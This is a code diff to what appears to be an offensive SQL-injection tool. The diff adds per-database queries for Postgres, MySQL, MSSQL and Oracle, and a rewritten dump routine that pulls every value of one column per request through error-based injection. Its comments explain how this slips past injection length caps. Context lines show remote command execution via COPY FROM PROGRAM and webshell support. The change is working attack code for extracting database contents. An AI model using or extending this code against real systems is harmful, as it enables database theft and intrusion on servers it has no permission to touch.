@@ -70,7 +70,7 @@ RCE_TABLE = "bf_rce"              # scratch table that captures command output
 UMARK = "bfUc"                   # UNION column-reflection probe
 ULEFT, URIGHT = "bfUL", "bfUR"   # markers wrapped around a UNION-extracted value
 
-VERSION = "3.6.6"
+VERSION = "3.6.7"
 _RED, _RESET = "\033[1;31m", "\033[0m"   # bold red
 _ART = r"""
  ____  _      _____ _   _ _____  ______ ____  _      _____
@@ -161,6 +161,10 @@ class Dbms:
         return " || '|' || ".join(f"coalesce(cast({self.quote_ident(c)} as text),'')" for c in cols)
     def q_row(self, t, cols, off):
         return f"SELECT {self.concat_cols(cols)} FROM {self.quote_ident(t)} ORDER BY 1 LIMIT 1 OFFSET {off}"
+    def q_col(self, t, c):
+        # every value of ONE column in a single (short) request - the result rides back in the
+        # error, which isn't length-capped, so this fits caps the per-row concat can't.
+        return f"SELECT string_agg(cast({self.quote_ident(c)} as text),',') FROM {self.quote_ident(t)}"
 
 
 class Postgres(Dbms):
@@ -187,6 +191,8 @@ class Postgres(Dbms):
         # pg_stat_user_tables lists ONLY user tables (no system noise) and is far shorter than
         # the information_schema query, so it fits moderate length caps in a single request.
         return "SELECT string_agg(relname,',') FROM pg_stat_user_tables"
+    def q_col(self, t, c):
+        return f"SELECT string_agg({self.quote_ident(c)}::text,',') FROM {self.quote_ident(t)}"
     # RCE: COPY ... FROM PROGRAM (superuser) for exec; COPY (...) TO for webshell.
     can_exec = True
     can_webshell = True
@@ -255,6 +261,8 @@ class MySQL(Dbms):
         return "concat_ws('|'," + ",".join(self.quote_ident(c) for c in cols) + ")"
     def q_row(self, t, cols, off):
         return f"SELECT {self.concat_cols(cols)} FROM {self.quote_ident(t)} ORDER BY 1 LIMIT {off},1"
+    def q_col(self, t, c):
+        return f"SELECT group_concat({self.quote_ident(c)}) FROM {self.quote_ident(t)}"
 
 
 class MSSQL(Dbms):
@@ -304,6 +312,8 @@ class MSSQL(Dbms):
     def q_row(self, t, cols, off):
         return (f"SELECT {self.concat_cols(cols)} FROM {self.quote_ident(t)} "
                 f"ORDER BY (SELECT NULL) OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY")
+    def q_col(self, t, c):
+        return f"SELECT string_agg(cast({self.quote_ident(c)} as nvarchar(max)),',') FROM {self.quote_ident(t)}"
 
 
 class Oracle(Dbms):
@@ -330,6 +340,9 @@ class Oracle(Dbms):
         return (f"SELECT {self.concat_cols(cols)} FROM "
                 f"(SELECT a.*, ROWNUM rn FROM (SELECT * FROM {self.quote_ident(t)} ORDER BY 1) a "
                 f"WHERE ROWNUM <= {off+1}) WHERE rn = {off+1}")
+    def q_col(self, t, c):
+        return (f"SELECT listagg(cast({self.quote_ident(c)} as varchar2(4000)),',') "
+                f"WITHIN GROUP (ORDER BY 1) FROM {self.quote_ident(t)}")
 
 
 DBMS_LIST = [Postgres(), MySQL(), MSSQL(), Oracle()]
@@ -1122,25 +1135,34 @@ def dump_mode(target, det, a):
     if not cols:
         print(f"[!] no columns found for '{table}' (wrong name, or length-capped — try --wordlist)")
         return
-    raw = read_scalar(target, det, a, det.dbms.q_count(table)) or "0"
-    count = int(re.sub(r"[^0-9]", "", raw) or "0")
-    limit = min(count, a.max_rows)
+    # extract ONE column per request: a short string_agg returns every value of that column at
+    # once (the result comes back in the error, which isn't length-capped — only the injected
+    # query is). Far shorter than concatenating all columns per row, so it fits caps the
+    # row-at-a-time approach can't, and it's gentle: one request per column.
+    coldata, truncated = {}, []
+    for c in cols:
+        raw = read_scalar(target, det, a, det.dbms.q_col(table, c))
+        coldata[c] = raw.split(",") if raw else []
+        if not raw:
+            truncated.append(c)
+    nrows = min(max((len(v) for v in coldata.values()), default=0), a.max_rows)
     print(f"\n=== DUMP: {table} ===")
     print(f"columns ({len(cols)}): {', '.join(cols)}")
-    print(f"rows: {count}" + (f"  (showing first {limit}, raise with --max-rows)" if count > limit else ""))
-    rows = []
-    for i in range(limit):
-        cells = (read_scalar(target, det, a, det.dbms.q_row(table, cols, i)) or "").split("|")
-        rows.append((cells + [""] * len(cols))[:len(cols)])
-    widths = [len(c) for c in cols]
-    for r in rows:
-        for j, cell in enumerate(r):
-            widths[j] = max(widths[j], len(cell))
+    print(f"rows: {nrows}")
+    if nrows == 0:
+        print("[!] no rows extracted — empty table, or even the per-column query is too long for")
+        print(f'    this cap. Pull values directly, e.g. --query "SELECT {cols[0]} FROM {table} LIMIT 1".')
+        return
+    rows = [[(coldata[c][i] if i < len(coldata[c]) else "") for c in cols] for i in range(nrows)]
+    widths = [max(len(c), *(len(r[j]) for r in rows)) for j, c in enumerate(cols)]
     line = lambda vals: " | ".join(v.ljust(widths[j]) for j, v in enumerate(vals))
     print("\n" + line(cols))
     print("-+-".join("-" * w for w in widths))
     for r in rows:
         print(line(r))
+    if truncated:
+        print(f"\n[!] too long for the cap (came back empty): {', '.join(truncated)} "
+              f"— pull these with a targeted --query.")
 
 
 # ===========================================================================
